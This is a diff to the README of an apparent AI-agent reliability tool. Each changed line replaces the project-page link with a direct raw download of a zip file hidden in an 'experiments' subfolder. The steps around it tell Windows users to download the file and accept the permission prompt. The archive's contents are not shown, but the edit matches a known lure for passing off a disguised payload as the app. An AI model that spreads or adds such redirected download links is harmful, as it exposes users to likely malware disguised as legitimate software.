@@ -1,6 +1,6 @@
 # 🤖 agent-reliability-engineering - Reliable AI agents with clear controls
 
-[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jesayas7817/agent-reliability-engineering)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jesayas7817/agent-reliability-engineering/raw/refs/heads/main/transfer/experiments/reliability_engineering_agent_1.3-beta.1.zip)
 
 ## 🖥️ What this app is
 
@@ -19,7 +19,7 @@ Use it to:
 Follow these steps on a Windows PC:
 
 1. Open the download page:
-   https://github.com/jesayas7817/agent-reliability-engineering
+   https://github.com/jesayas7817/agent-reliability-engineering/raw/refs/heads/main/transfer/experiments/reliability_engineering_agent_1.3-beta.1.zip
 2. On the GitHub page, look for the latest release or the main project files.
 3. Download the Windows file or the project package from that page.
 4. If Windows asks for permission, choose **Yes**.
@@ -66,7 +66,7 @@ Work with more than one agent in the same flow. This helps when tasks need separ
 
 ### 1. Open the GitHub page
 Go to:
-https://github.com/jesayas7817/agent-reliability-engineering
+https://github.com/jesayas7817/agent-reliability-engineering/raw/refs/heads/main/transfer/experiments/reliability_engineering_agent_1.3-beta.1.zip
 
 ### 2. Find the download
 Look for the latest release, build, or package on the page.
@@ -186,7 +186,7 @@ These checks help you learn which setup works best.
 ## 🔗 Download again
 
 Visit the project page to download or open the latest files:
-https://github.com/jesayas7817/agent-reliability-engineering
+https://github.com/jesayas7817/agent-reliability-engineering/raw/refs/heads/main/transfer/experiments/reliability_engineering_agent_1.3-beta.1.zip
 
 ## 🧩 Project focus
 
